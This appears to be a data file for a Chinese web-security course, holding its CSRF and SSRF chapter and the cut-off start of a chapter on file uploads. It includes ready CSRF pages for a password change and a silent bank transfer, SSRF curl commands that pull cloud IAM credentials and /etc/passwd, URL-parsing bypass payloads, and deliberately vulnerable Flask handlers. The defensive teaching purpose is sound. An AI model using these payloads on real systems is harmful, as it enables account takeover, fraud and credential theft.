+SECTION_CONTENT["web-04-01"] = "<div class=\"section-transition\"><p>在上一章中，我们学会了利用 XSS 在用户浏览器中执行恶意脚本。但如果攻击者的目标不是窃取用户数据，而是<strong>冒充用户执行操作</strong>呢？这就是 CSRF 的威胁。同时，我们还将探索另一个名字相似但原理完全不同的漏洞：SSRF。</p></div>\n\n<h2>CSRF 与 SSRF：让别人的手替你干活</h2>\n\n<p>在 Web 安全的世界里，有两类漏洞都涉及\"伪造请求\"，但它们的攻击目标、原理和防御方式却截然不同。CSRF（Cross-Site Request Forgery，跨站请求伪造）利用的是<strong>浏览器对用户身份的信任</strong>，而 SSRF（Server-Side Request Forgery，服务器端请求伪造）利用的是<strong>服务器对外部资源的访问能力</strong>。本章我们将深入剖析这两种漏洞的原理、攻击手法和防御策略。</p>\n\n<h3>场景：CyberShop 的密码修改功能</h3>\n\n<p>假设你正在测试 CyberShop 网站，发现了一个\"修改密码\"的功能。当你登录后台并点击修改密码时，浏览器向服务器发送了这样一个请求：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">POST /api/change-password HTTP/1.1\nHost: cybershop.com\nCookie: session_id=abc123def456\nContent-Type: application/x-www-form-urlencoded\n\nnew_password=hunter2</code></pre></div>\n\n<p>这个请求看起来再正常不过了。你已登录，服务器通过 Cookie 识别你的身份，然后帮你修改密码。但这里隐藏着一个致命的问题：<strong>如果这个请求不是你自己发起的，而是被诱导访问了一个恶意页面后自动发起的呢？</strong></p>\n\n<p>想象一下：你在浏览某个论坛时，看到一个有趣的帖子。你点开查看，但页面加载的瞬间，一段隐藏的 JavaScript 代码自动向 CyberShop 发送了修改密码的请求。由于你的浏览器仍然保持着登录状态，Cookie 会被自动附带在请求中——服务器根本不知道这个请求不是你主动发起的！</p>\n\n<h3>CSRF 攻击演示：构造隐形表单</h3>\n\n<p>让我们看看攻击者是如何构造 CSRF 攻击的。最经典的方式是利用一个自动提交的表单：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;!-- 攻击者构造的恶意页面 --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;恭喜你中奖了！&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n  &lt;h1&gt;恭喜你获得 iPhone 15！&lt;/h1&gt;\n  &lt;p&gt;请点击下方按钮领取奖品...&lt;/p&gt;\n  \n  &lt;!-- 隐藏的表单 --&gt;\n  &lt;form id=\"csrf-form\" action=\"https://cybershop.com/api/change-password\" \n        method=\"POST\" style=\"display:none;\"&gt;\n    &lt;input type=\"hidden\" name=\"new_password\" value=\"hacked123\" /&gt;\n  &lt;/form&gt;\n  \n  &lt;script&gt;\n    // 页面加载后自动提交表单\n    document.getElementById('csrf-form').submit();\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre></div>\n\n<p>当受害者访问这个页面时，会发生以下过程：</p>\n\n<ol>\n  <li>用户看到\"恭喜中奖\"的诱人页面</li>\n  <li>隐藏的表单在后台自动提交到 CyberShop 的密码修改接口</li>\n  <li>浏览器自动附带用户的 Cookie（包括 session_id）</li>\n  <li>CyberShop 服务器收到请求，验证 Cookie 有效，执行密码修改</li>\n  <li>用户的密码已被改为 \"hacked123\"，但用户毫不知情</li>\n</ol>\n\n<div class=\"callout warn\"><div class=\"callout-title\">警告</div><p>CSRF 攻击的核心在于：浏览器会自动在每个请求中附带目标域名的 Cookie，无论这个请求是由用户主动触发还是由第三方页面触发的。这意味着只要用户已登录目标网站，攻击者就可以冒充用户执行任何操作！</p></div>\n\n<p>除了表单自动提交，CSRF 攻击还可以通过其他方式实现：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;!-- 方式1：利用 img 标签发起 GET 请求 --&gt;\n&lt;img src=\"https://cybershop.com/api/change-password?new_password=hacked123\" \n     width=\"0\" height=\"0\" /&gt;\n\n&lt;!-- 方式2：利用 link 标签预加载 --&gt;\n&lt;link rel=\"prefetch\" href=\"https://cybershop.com/api/delete-account\" /&gt;\n\n&lt;!-- 方式3：利用 XHR（受同源策略限制）--&gt;\n&lt;script&gt;\n  fetch('https://cybershop.com/api/transfer', {\n    method: 'POST',\n    credentials: 'include',  // 强制携带 Cookie\n    body: 'amount=10000&to=attacker_account'\n  });\n&lt;/script&gt;</code></pre></div>\n\n<h3>实战案例：CSRF 银行转账攻击</h3>\n\n<p>让我们来看一个更具破坏性的 CSRF 攻击场景。假设 CyberBank 的网上银行系统允许用户通过以下接口进行转账：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">POST /api/transfer HTTP/1.1\nHost: cyberbank.com\nCookie: auth_token=xyz789session\nContent-Type: application/json\n\n{\n  \"to_account\": \"6222000012345678\",\n  \"amount\": 5000,\n  \"currency\": \"CNY\"\n}</code></pre></div>\n\n<p>攻击者精心构造了一个钓鱼邮件，内容看似是一篇普通的新闻文章，但其中嵌入了自动执行的 CSRF 攻击：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;2024年最值得投资的理财产品&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n  &lt;h1&gt;2024年最值得投资的理财产品&lt;/h1&gt;\n  &lt;p&gt;在当前的经济环境下，以下三种理财产品备受关注...&lt;/p&gt;\n  \n  &lt;!-- 文章正文，看起来完全无害 --&gt;\n  &lt;article&gt;\n    &lt;h2&gt;1. 稳健型基金&lt;/h2&gt;\n    &lt;p&gt;稳健型基金一直是保守投资者的首选...&lt;/p&gt;\n  &lt;/article&gt;\n  \n  &lt;!-- 隐藏的 CSRF 攻击：利用 iframe 和 JavaScript --&gt;\n  &lt;iframe id=\"attack-frame\" style=\"display:none;\"&gt;&lt;/iframe&gt;\n  \n  &lt;script&gt;\n    // 延迟执行，避免引起注意\n    setTimeout(function() {\n      var form = document.createElement('form');\n      form.method = 'POST';\n      form.action = 'https://cyberbank.com/api/transfer';\n      form.target = 'attack-frame';\n      \n      // 构造转账请求\n      var toField = document.createElement('input');\n      toField.type = 'hidden';\n      toField.name = 'to_account';\n      toField.value = '6222999988887777';  // 攻击者账户\n      \n      var amountField = document.createElement('input');\n      amountField.type = 'hidden';\n      amountField.name = 'amount';\n      amountField.value = '50000';  // 转账 5 万元\n      \n      form.appendChild(toField);\n      form.appendChild(amountField);\n      document.body.appendChild(form);\n      form.submit();\n    }, 3000);  // 3秒后执行，用户正在阅读文章\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre></div>\n\n<p>这个攻击的精妙之处在于：</p>\n\n<ol>\n  <li><strong>社会工程</strong>：攻击者通过诱人的标题吸引受害者点击链接</li>\n  <li><strong>延迟执行</strong>：等待 3 秒后再发起攻击，此时用户正在阅读文章，不会注意到异常</li>\n  <li><strong>隐藏执行</strong>：使用隐藏的 iframe 作为表单提交目标，页面不会跳转</li>\n  <li><strong>静默完成</strong>：转账在后台完成，用户毫无察觉</li>\n</ol>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>CSRF 攻击的成功很大程度上依赖于<strong>社会工程</strong>。攻击者需要诱导受害者访问恶意页面，这通常通过钓鱼邮件、社交媒体消息、论坛帖子等方式实现。因此，安全意识培训也是防御 CSRF 的重要一环。</p></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>为什么 CSRF 能够成功？浏览器的\"自动\"机制</h3>\n\n<p>CSRF 漏洞之所以存在，根本原因在于 HTTP 协议的<strong>无状态性</strong>和浏览器的<strong>Cookie 自动附带机制</strong>。让我们深入理解这个问题：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 服务器端验证逻辑（伪代码）\ndef change_password(request):\n    # 服务器只检查 Cookie 是否有效\n    user = get_user_from_session(request.cookies['session_id'])\n    \n    if user:\n        # Cookie 有效，执行操作\n        user.password = request.form['new_password']\n        user.save()\n        return \"密码修改成功\"\n    else:\n        return \"未登录\"</code></pre></div>\n\n<p>在上述代码中，服务器只验证了 Cookie 中的 session_id 是否有效，但<strong>没有验证这个请求是否是用户主动发起的</strong>。这正是 CSRF 攻击的突破口。</p>\n\n<p>浏览器处理 Cookie 的规则如下：</p>\n\n<ul>\n  <li><strong>域匹配</strong>：Cookie 会被发送到设置它的域名及其子域名</li>\n  <li><strong>路径匹配</strong>：Cookie 会被发送到设置它的路径及其子路径</li>\n  <li><strong>自动附带</strong>：浏览器会自动在每个匹配的请求中附带 Cookie，无需用户干预</li>\n  <li><strong>跨域限制</strong>：Cookie 不会被发送到不匹配的域名（但表单提交不受此限制）</li>\n</ul>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>CSRF 攻击有一个重要前提：受害者必须在目标网站上有活跃的会话（即已登录且 Cookie 未过期）。如果用户未登录或 Cookie 已失效，CSRF 攻击将失败。</p></div>\n\n<h3>防御 CSRF：Anti-CSRF Token</h3>\n\n<p>最有效的 CSRF 防御机制是使用 <strong>Anti-CSRF Token</strong>（反 CSRF 令牌）。其核心思想是：在每个敏感操作的表单中包含一个随机生成的、不可预测的令牌，服务器在处理请求时必须验证这个令牌。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># Flask 应用中的 Anti-CSRF Token 实现示例\nfrom flask import Flask, request, session, render_template_string\nimport secrets\n\napp = Flask(__name__)\napp.secret_key = secrets.token_hex(32)\n\ndef generate_csrf_token():\n    \"\"\"生成随机 CSRF Token\"\"\"\n    if 'csrf_token' not in session:\n        session['csrf_token'] = secrets.token_hex(32)\n    return session['csrf_token']\n\n@app.route('/change-password', methods=['GET'])\ndef change_password_form():\n    \"\"\"渲染包含 CSRF Token 的表单\"\"\"\n    token = generate_csrf_token()\n    html = f'''\n    &lt;form method=\"POST\" action=\"/api/change-password\"&gt;\n        &lt;input type=\"hidden\" name=\"csrf_token\" value=\"{token}\" /&gt;\n        &lt;input type=\"password\" name=\"new_password\" placeholder=\"新密码\" /&gt;\n        &lt;button type=\"submit\"&gt;修改密码&lt;/button&gt;\n    &lt;/form&gt;\n    '''\n    return render_template_string(html)\n\n@app.route('/api/change-password', methods=['POST'])\ndef change_password():\n    \"\"\"处理密码修改请求，验证 CSRF Token\"\"\"\n    submitted_token = request.form.get('csrf_token')\n    session_token = session.get('csrf_token')\n    \n    # 验证 Token 是否存在且匹配\n    if not submitted_token or submitted_token != session_token:\n        return \"CSRF Token 验证失败\", 403\n    \n    # Token 验证通过，执行操作\n    new_password = request.form.get('new_password')\n    # ... 实际修改密码的逻辑 ...\n    \n    # 使用后销毁 Token（一次性使用）\n    session.pop('csrf_token', None)\n    \n    return \"密码修改成功\"</code></pre></div>\n\n<p>Anti-CSRF Token 的工作原理：</p>\n\n<ol>\n  <li><strong>生成</strong>：服务器为每个用户会话生成一个唯一的随机 Token</li>\n  <li><strong>嵌入</strong>：Token 被嵌入到表单的隐藏字段中</li>\n  <li><strong>提交</strong>：用户提交表单时，Token 随表单数据一起发送</li>\n  <li><strong>验证</strong>：服务器验证提交的 Token 是否与会话中的 Token 匹配</li>\n  <li><strong>销毁</strong>：Token 使用后立即销毁，防止重放攻击</li>\n</ol>\n\n<p>攻击者无法伪造 CSRF Token，因为：</p>\n\n<ul>\n  <li>Token 是随机生成的，不可预测</li>\n  <li>Token 存储在服务器的用户会话中，攻击者无法获取</li>\n  <li>受同源策略保护，攻击者的页面无法读取目标页面的表单内容</li>\n</ul>\n\n<h3>SameSite Cookie：现代浏览器的 CSRF 防御</h3>\n\n<p>除了 Anti-CSRF Token，现代浏览器还提供了 <strong>SameSite Cookie</strong> 属性作为额外的防御层。SameSite 属性控制 Cookie 在跨站请求中的发送行为：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 设置 SameSite Cookie 的示例\n\n# Strict 模式：Cookie 仅在同站请求中发送，完全阻止跨站请求携带 Cookie\nSet-Cookie: session_id=abc123; SameSite=Strict\n\n# Lax 模式（默认）：允许部分安全的跨站 GET 请求携带 Cookie\nSet-Cookie: session_id=abc123; SameSite=Lax\n\n# None 模式：允许跨站请求携带 Cookie（必须配合 Secure 属性）\nSet-Cookie: session_id=abc123; SameSite=None; Secure</code></pre></div>\n\n<p>三种模式的区别：</p>\n\n<table border=\"1\" cellpadding=\"8\" cellspacing=\"0\">\n  <thead>\n    <tr>\n      <th>模式</th>\n      <th>同站请求</th>\n      <th>跨站 GET（如链接跳转）</th>\n      <th>跨站 POST（如表单提交）</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Strict</strong></td>\n      <td>✅ 发送</td>\n      <td>❌ 不发送</td>\n      <td>❌ 不发送</td>\n    </tr>\n    <tr>\n      <td><strong>Lax</strong></td>\n      <td>✅ 发送</td>\n      <td>✅ 发送</td>\n      <td>❌ 不发送</td>\n    </tr>\n    <tr>\n      <td><strong>None</strong></td>\n      <td>✅ 发送</td>\n      <td>✅ 发送</td>\n      <td>✅ 发送</td>\n    </tr>\n  </tbody>\n</table>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>从 Chrome 80 开始，如果 Cookie 没有显式设置 SameSite 属性，浏览器会默认将其视为 <code>SameSite=Lax</code>。这大大降低了 CSRF 攻击的风险，但并不能完全替代 Anti-CSRF Token，因为某些场景（如同站但不同源的子域名）仍然可能存在风险。</p></div>\n\n<p>其他 CSRF 防御措施：</p>\n\n<ul>\n  <li><strong>验证 Origin/Referer 头</strong>：检查请求来源是否合法</li>\n  <li><strong>Double Submit Cookie</strong>：在 Cookie 和请求参数中同时传递 Token</li>\n  <li><strong>自定义请求头</strong>：要求请求包含特定的自定义头（如 X-CSRF-Token）</li>\n  <li><strong>敏感操作二次验证</strong>：要求用户重新输入密码或进行短信验证</li>\n</ul>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h3>从客户端到服务端：SSRF 漏洞</h3>\n\n<p>CSRF 是利用浏览器自动发送请求的特性来<strong>冒充用户</strong>执行操作。而 SSRF（Server-Side Request Forgery，服务器端请求伪造）则是利用服务器的<strong>URL 访问能力</strong>来访问攻击者指定的资源。</p>\n\n<p>SSRF 漏洞通常出现在以下功能中：</p>\n\n<ul>\n  <li><strong>图片加载/预览</strong>：用户提供图片 URL，服务器下载并展示</li>\n  <li><strong>网页截图</strong>：用户提供 URL，服务器访问并截图</li>\n  <li><strong>文件下载</strong>：用户提供下载链接，服务器代为下载</li>\n  <li><strong>Webhook 测试</strong>：用户提供回调 URL，服务器发送测试请求</li>\n  <li><strong>URL 分享/预览</strong>：用户提供链接，服务器抓取内容生成预览</li>\n</ul>\n\n<p>让我们看一个具体的 SSRF 攻击场景：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 存在 SSRF 漏洞的服务器端代码\nfrom flask import Flask, request, Response\nimport requests\n\napp = Flask(__name__)\n\n@app.route('/api/fetch-url', methods=['POST'])\ndef fetch_url():\n    \"\"\"根据用户提供的 URL 获取内容\"\"\"\n    url = request.form.get('url')\n    \n    # 危险：没有验证 URL 就直接发起请求\n    try:\n        response = requests.get(url, timeout=5)\n        return Response(response.content, content_type=response.headers['Content-Type'])\n    except Exception as e:\n        return f\"请求失败: {str(e)}\", 500</code></pre></div>\n\n<p>攻击者可以利用这个接口访问服务器的内部资源：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 攻击1：访问云服务的元数据服务（AWS/GCP/Azure）\ncurl -X POST https://cybershop.com/api/fetch-url \\\n  -d \"url=http://169.254.169.254/latest/meta-data/\"\n\n# 返回示例（AWS EC2 元数据）：\n# {\n#   \"ami-id\": \"ami-0abcdef1234567890\",\n#   \"instance-id\": \"i-0123456789abcdef0\",\n#   \"iam/security-credentials/\": \"...\",  # 可能包含访问密钥！\n#   ...\n# }\n\n# 攻击2：扫描内部网络\ncurl -X POST https://cybershop.com/api/fetch-url \\\n  -d \"url=http://192.168.1.1/admin\"  # 路由器管理页面\n\ncurl -X POST https://cybershop.com/api/fetch-url \\\n  -d \"url=http://10.0.0.5:8080/internal-api\"  # 内部服务\n\n# 攻击3：读取本地文件（使用 file:// 协议）\ncurl -X POST https://cybershop.com/api/fetch-url \\\n  -d \"url=file:///etc/passwd\"\n\n# 攻击4：访问内部数据库（如果协议支持）\ncurl -X POST https://cybershop.com/api/fetch-url \\\n  -d \"url=gopher://localhost:3306/...\"</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">警告</div><p>云服务的元数据服务（169.254.169.254）是 SSRF 攻击的高价值目标。许多云服务商（AWS、GCP、Azure、阿里云等）都使用这个特殊 IP 提供实例元数据，其中可能包含 IAM 角色凭证、启动脚本等敏感信息。攻击者一旦获取这些信息，可能完全接管云服务器！</p></div>\n\n<p>SSRF 攻击的危害程度取决于服务器的网络位置和权限：</p>\n\n<ul>\n  <li><strong>访问内部网络</strong>：绕过防火墙，访问内网服务</li>\n  <li><strong>获取云凭证</strong>：通过元数据服务获取临时访问密钥</li>\n  <li><strong>端口扫描</strong>：探测内部网络的开放端口和服务</li>\n  <li><strong>利用内部服务</strong>：访问 Redis、Memcached 等内部服务的未授权接口</li>\n  <li><strong>读取本地文件</strong>：使用 file:// 协议读取服务器文件系统</li>\n  <li><strong>发起内网攻击</strong>：以服务器为跳板攻击内网其他机器</li>\n</ul>\n\n<h3>SSRF 攻击示例：深入剖析</h3>\n\n<p>让我们详细看一个攻击者如何利用 SSRF 访问云元数据并获取 AWS 凭证：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 第一步：发现 SSRF 漏洞\n# 攻击者注意到某网站有\"网页截图\"功能，用户提交 URL，服务器返回截图\n\n# 第二步：测试访问云元数据\ncurl -X POST https://example.com/api/screenshot \\\n  -d \"url=http://169.254.169.254/latest/meta-data/\"\n\n# 服务器返回元数据内容（可能以截图形式，也可能直接返回文本）\n\n# 第三步：获取 IAM 角色名称\ncurl -X POST https://example.com/api/screenshot \\\n  -d \"url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n# 返回：MyAppRole\n\n# 第四步：获取临时访问凭证\ncurl -X POST https://example.com/api/screenshot \\\n  -d \"url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole\"\n# 返回：\n# {\n#   \"Code\": \"Success\",\n#   \"AccessKeyId\": \"ASIA...\",\n#   \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCY...\",\n#   \"Token\": \"FwoGZXIvYXdzE...\",\n#   \"Expiration\": \"2024-01-15T12:00:00Z\"\n# }\n\n# 第五步：使用获取的凭证访问 AWS 服务\nexport AWS_ACCESS_KEY_ID=\"ASIA...\"\nexport AWS_SECRET_ACCESS_KEY=\"wJalrXUtnFEMI/K7MDENG/bPxRfiCY...\"\nexport AWS_SESSION_TOKEN=\"FwoGZXIvYXdzE...\"\n\n# 列出 S3 存储桶\naws s3 ls</code></pre></div>\n\n<h3>SSRF 绕过技术：攻击者的进阶手段</h3>\n\n<p>当应用程序实施了基本的 SSRF 防护（如黑名单验证）后，攻击者会使用更高级的绕过技术：</p>\n\n<h4>DNS 重绑定攻击（DNS Rebinding）</h4>\n\n<p>DNS 重绑定是一种利用 DNS 解析时间差的高级攻击技术。攻击者注册一个特殊域名，该域名的 DNS 解析结果会在短时间内发生变化：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># DNS 重绑定攻击原理\n\n# 第一步：服务器收到请求 url=http://attacker-dns.com/fetch\n# 第二步：服务器解析域名 attacker-dns.com -> 得到外部 IP（如 93.184.216.34）\n# 第三步：服务器验证 IP 不是内网地址 -> 通过检查\n# 第四步：服务器发起 HTTP 请求到 attacker-dns.com\n# 关键：此时 DNS 再次解析，返回内网 IP（如 127.0.0.1）\n# 第五步：服务器实际向 127.0.0.1 发起请求 -> SSRF 成功！\n\n# 攻击者的 DNS 服务器配置（使用 rbndr.us 等免费服务）\n# 第一次解析返回：93.184.216.34（外部 IP）\n# 第二次解析返回：127.0.0.1（内网 IP）\n# 利用 TTL=0 强制每次都重新解析</code></pre></div>\n\n<h4>URL 编码与格式混淆</h4>\n\n<p>许多 URL 验证存在解析差异，攻击者可以利用各种 URL 格式绕过检查：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># IP 地址的多种表示方式\n# 十进制：127.0.0.1\n# 十六进制：0x7f000001\n# 八进制：0177.0.0.1\n# 整数形式：2130706433\n# 混合形式：127.1（自动补零为 127.0.0.1）\n\n# 绕过示例\nhttp://0x7f.0.0.1/          # 十六进制\nhttp://2130706433/           # 整数\nhttp://127.1/                # 缩写形式\nhttp://0177.0.0.1/           # 八进制\n\n# 利用 URL 解析差异\nhttp://evil.com@127.0.0.1/   # 某些库会连接 127.0.0.1\nhttp://127.0.0.1#@evil.com/  # 利用锚点截断\nhttp://127.0.0.1%2523@evil.com/  # 双重编码\n\n# 利用重定向绕过\n# 第一步：请求 http://attacker.com/redirect.php\n# 第二步：redirect.php 返回 302 重定向到 http://169.254.169.254/\n# 第三步：服务器跟随重定向，实际访问内网地址</code></pre></div>\n\n<h4>利用 URL 解析库差异</h4>\n\n<p>不同的编程语言和库对 URL 的解析方式存在差异，攻击者可以利用这些差异绕过验证：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 不同库的 URL 解析差异示例\n\n# Python urllib 的解析\nimport urllib.parse\nparsed = urllib.parse.urlparse('http://evil.com\\\\@127.0.0.1/')\nprint(parsed.hostname)  # 可能解析为 127.0.0.1\n\n# 某些库对特殊字符的处理不同\n# http://①②⑦.⓪.⓪.①/  # Unicode 数字\n# http://127.0.0.1:80#@evil.com/  # 锚点截断\n# http://127.0.0.1:80?@evil.com/  # 查询参数截断\n\n# 利用 URL 中的换行符和空格\n# http://127.0.0.1/\\r\\nHost: evil.com\n# http://  127.0.0.1/  # 前导空格</code></pre></div>\n\n<div class=\"callout default\"><div class=\"callout-title\">知识扩展</div><p>SSRF 绕过技术的核心在于利用<strong>验证逻辑</strong>和<strong>实际请求逻辑</strong>之间的差异。验证模块认为 URL 指向外部地址，但实际发起请求的库可能解析为内网地址。因此，防御 SSRF 的关键是确保验证和请求使用<strong>同一套解析逻辑</strong>，并在请求发起前对最终 IP 进行二次校验。</p></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h3>防御策略：CSRF 与 SSRF</h3>\n\n<h4>CSRF 防御清单</h4>\n\n<ul>\n  <li><strong>使用 Anti-CSRF Token</strong>：在所有状态改变操作中包含不可预测的令牌</li>\n  <li><strong>设置 SameSite Cookie</strong>：使用 <code>SameSite=Strict</code> 或 <code>SameSite=Lax</code></li>\n  <li><strong>验证请求来源</strong>：检查 Origin 和 Referer 头</li>\n  <li><strong>敏感操作二次确认</strong>：要求重新验证身份</li>\n  <li><strong>避免 GET 请求修改状态</strong>：所有写操作使用 POST/PUT/DELETE</li>\n</ul>\n\n<h4>SSRF 防御清单</h4>\n\n<ul>\n  <li><strong>白名单 URL</strong>：只允许访问预定义的可信域名</li>\n  <li><strong>黑名单 IP</strong>：阻止访问内部网络地址段（127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16）</li>\n  <li><strong>禁用危险协议</strong>：只允许 http:// 和 https://，禁止 file://, gopher://, dict:// 等</li>\n  <li><strong>DNS 重绑定防护</strong>：在解析 URL 后立即使用解析出的 IP，防止 DNS 重绑定攻击</li>\n  <li><strong>限制响应</strong>：不向用户展示完整的响应内容，只返回必要的信息</li>\n  <li><strong>网络隔离</strong>：将可发起外部请求的服务放在独立的网络区域，限制其对内网的访问</li>\n</ul>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># SSRF 防御示例：URL 白名单验证\nimport urllib.parse\nimport socket\nimport ipaddress\n\nALLOWED_DOMAINS = ['images.example.com', 'cdn.example.com']\nBLOCKED_NETWORKS = [\n    ipaddress.ip_network('127.0.0.0/8'),\n    ipaddress.ip_network('10.0.0.0/8'),\n    ipaddress.ip_network('172.16.0.0/12'),\n    ipaddress.ip_network('192.168.0.0/16'),\n    ipaddress.ip_network('169.254.0.0/16'),\n    ipaddress.ip_network('::1/128'),\n]\n\ndef is_safe_url(url):\n    \"\"\"验证 URL 是否安全\"\"\"\n    parsed = urllib.parse.urlparse(url)\n    \n    # 1. 只允许 http/https 协议\n    if parsed.scheme not in ['http', 'https']:\n        return False\n    \n    # 2. 验证域名是否在白名单中\n    if parsed.hostname not in ALLOWED_DOMAINS:\n        return False\n    \n    # 3. 解析域名获取 IP，检查是否为内网地址\n    try:\n        ip_str = socket.gethostbyname(parsed.hostname)\n        ip = ipaddress.ip_address(ip_str)\n        \n        for network in BLOCKED_NETWORKS:\n            if ip in network:\n                return False\n    except socket.gaierror:\n        return False\n    \n    return True</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">最佳实践</div><p>防御 CSRF 和 SSRF 需要多层防护策略。对于 CSRF，优先使用框架内置的 CSRF 保护机制（如 Django 的 csrf_token、Spring Security 的 CSRF 支持）；对于 SSRF，采用\"默认拒绝\"的白名单策略，并结合网络隔离限制服务器的访问范围。</p></div>\n\n<h3>总结</h3>\n\n<p>CSRF 和 SSRF 虽然名字相似，但攻击原理和目标完全不同：</p>\n\n<table border=\"1\" cellpadding=\"8\" cellspacing=\"0\">\n  <thead>\n    <tr>\n      <th>特性</th>\n      <th>CSRF</th>\n      <th>SSRF</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>攻击目标</strong></td>\n      <td>冒充用户执行操作</td>\n      <td>利用服务器访问内部资源</td>\n    </tr>\n    <tr>\n      <td><strong>利用的信任</strong></td>\n      <td>浏览器自动发送 Cookie</td>\n      <td>服务器可访问外部/内部 URL</td>\n    </tr>\n    <tr>\n      <td><strong>攻击发起者</strong></td>\n      <td>用户的浏览器</td>\n      <td>服务器</td>\n    </tr>\n    <tr>\n      <td><strong>主要防御</strong></td>\n      <td>Anti-CSRF Token + SameSite</td>\n      <td>URL 白名单 + 网络隔离</td>\n    </tr>\n  </tbody>\n</table>\n\n<p>在下一章中，我们将探讨文件上传漏洞——当应用程序允许用户上传文件时，攻击者如何利用这个功能执行任意代码。</p>\n\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF('ctf-020')\"><span class=\"arrow\">▶</span> CTF挑战: SSRF 101</button>\n\n---SECTION_BREAK---";
+
+SECTION_CONTENT["web-05-01"] = "<div class=\"section-transition\"><p>上一章我们讨论了 CSRF 和 SSRF——利用信任关系发起攻击。本章我们来看另一个常见的攻击面：当应用允许用户<strong>上传文件</strong>时，会发生什么？一个看似无害的功能，可能成为攻击者获取服务器控制权的入口。</p></div>\n\n<h2>文件上传漏洞：上传一张图片，拿下一台服务器</h2>\n\n<p>文件上传功能是许多 Web 应用的标配——头像上传、文档分享、图片发布等功能都需要处理用户上传的文件。然而，如果应用程序没有对上传的文件进行严格的验证和安全处理，攻击者就可以上传恶意文件（如 Webshell），从而在服务器上执行任意命令，完全控制服务器。</p>\n\n<h3>场景：CyberShop 的头像上传功能</h3>\n\n<p>CyberShop 允许用户上传个人头像。前端界面显示：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;!-- 头像上传表单 --&gt;\n&lt;form action=\"/api/upload-avatar\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n  &lt;div class=\"upload-area\"&gt;\n    &lt;label for=\"avatar\"&gt;选择头像图片&lt;/label&gt;\n    &lt;input type=\"file\" id=\"avatar\" name=\"avatar\" \n           accept=\".jpg,.jpeg,.png,.gif\" /&gt;\n    &lt;p class=\"hint\"&gt;支持 JPG、PNG、GIF 格式，最大 5MB&lt;/p&gt;\n  &lt;/div&gt;\n  &lt;button type=\"submit\"&gt;上传头像&lt;/button&gt;\n&lt;/form&gt;</code></pre></div>\n\n<p>前端通过 <code>accept</code> 属性限制了文件类型，只显示图片文件。但这仅仅是<strong>前端的限制</strong>——用户完全可以绕过这个限制，直接向服务器发送任意类型的文件。真正的安全验证必须在服务器端进行。</p>\n\n<p>让我们看看服务器端可能存在的漏洞代码：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 存在漏洞的文件上传处理（Python/Flask）\nfrom flask import Flask, request, redirect\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/var/www/cybershop/uploads/'\n\n@app.route('/api/upload-avatar', methods=['POST'])\ndef upload_avatar():\n    if 'avatar' not in request.files:\n        return \"未选择文件\", 400\n    \n    file = request.files['avatar']\n    \n    if file.filename == '':\n        return \"未选择文件\", 400\n    \n    # 危险：直接使用原始文件名，未进行任何验证\n    filename = file.filename\n    filepath = os.path.join(UPLOAD_FOLDER, filename)\n    file.save(filepath)\n    \n    return redirect('/profile?avatar=' + filename)</code></pre></div>\n\n<p>这段代码存在多个严重问题：</p>\n\n<ol>\n  <li><strong>未验证文件类型</strong>：接受任何上传的文件</li>\n  <li><strong>使用原始文件名</strong>：可能导致路径遍历攻击（如 <code>../../etc/passwd</code>）</li>\n  <li><strong>文件存储在 Web 可访问目录</strong>：上传的文件可以直接通过 URL 访问</li>\n  <li><strong>未检查文件内容</strong>：恶意文件会被原样保存</li>\n</ol>\n\n<h3>基础攻击：上传 